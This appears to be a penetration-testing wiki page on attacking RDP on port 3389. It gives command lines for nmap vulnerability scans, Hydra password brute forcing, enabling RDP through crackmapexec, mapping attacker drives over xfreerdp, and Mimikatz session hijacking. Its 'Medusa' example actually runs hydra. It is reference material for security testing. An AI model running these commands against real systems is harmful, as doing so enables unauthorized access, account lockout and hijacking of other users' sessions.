# Port 3389 | RDP

## Enumeration

### Nmap

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 <IP>
```

## Bruteforce

Brute forcing can easily lock user accounts. If possible enumerate the domain password policy before proceeding.

### Hydra

```bash
hydra -L <User/s.txt> -P <Password/s.txt> rdp://<IP>
```

### Medusa

```bash
hydra -t 4  -l <User> -P <Password/s.txt> rdp://<IP>
```

## Connecting

### Crackmapexec

Requires administrative privileges, enables RDP on the target host.

```bash
crackmapexec smb '<IP>' -u '<User>' -p '<Password>' -M rdp -o ACTION=enable # Enable RDP
```

### rdesktop

```bash
rdesktop -u <Username> <IP>
rdesktop -d <Domain> -u <Username> -p <Password> <IP>
```

### xfreerdp

```bash
xfreerdp /v:'<IP>' /u:'<User>' /p:'<Password>'
xfreerdp /v:'<IP>' /u:'<User>' /p:'<Password>' +clipboard

#Maps specified folder on attacking machine to RDP host
xfreerdp /v:'<IP>' /u:'<User>' /p:'<Password>' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

## **Hijacking**

This method is not stealthy and will disconnect a users active terminal service session. However, you will also be able to connect to a disconnected session which could be stealthier.&#x20;

This method also requires privileges as SYSTEM on the terminal server host.

### **Mimikatz**

```powershell
Invoke-Mimikatz -Command '"ts::sessions"'
```



Connect to the terminal services session.&#x20;

```powershell
Invoke-Mimikatz -Command '"token::elevate" "ts::remote /id:4"'
```

## **Man-in-the-Middle**

[SETH](https://github.com/SySS-Research/Seth) can be used to perform Man-in-the-Middle attacks over RDP.&#x20;

{% content-ref url="../everything-active-directory/adversary-in-the-middle/rdp-mitm.md" %}
[rdp-mitm.md](../everything-active-directory/adversary-in-the-middle/rdp-mitm.md)
{% endcontent-ref %}

